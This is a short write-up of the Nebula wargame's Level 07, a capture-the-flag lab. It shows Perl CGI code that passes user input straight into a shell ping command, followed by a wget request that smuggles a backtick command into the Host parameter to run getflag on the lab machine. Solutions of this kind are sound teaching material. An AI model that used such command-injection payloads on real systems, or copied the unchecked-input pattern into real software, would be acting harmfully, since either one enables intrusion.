# Guide to Nebula Level 07


## Level Info
The **flag07** user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

To do this level, log in as the **level07** account with the password **level07**. Files for this level can be found in /home/flag07.


## Solution
This level was a example of command injection. The vulnurable Perl code was
```perl
use CGI qw{param};

# snip
    $host = $_[0];
# snip
    @output = `ping -c 3 $host 2>&1`;
# snip
```
The user input was passwed to the shell command without checking and thus anybody can embed shell commands in the argument and get a successful command execution via the binary. We can get the flag by injecting shell command like this
```bash
wget "127.0.0.1:7007/index.cgi?Host=\`getflag > /tmp/got_flag\`"
```
Upon successful execution, we can cat the `/tmp/got_flag` file to confirm the flag
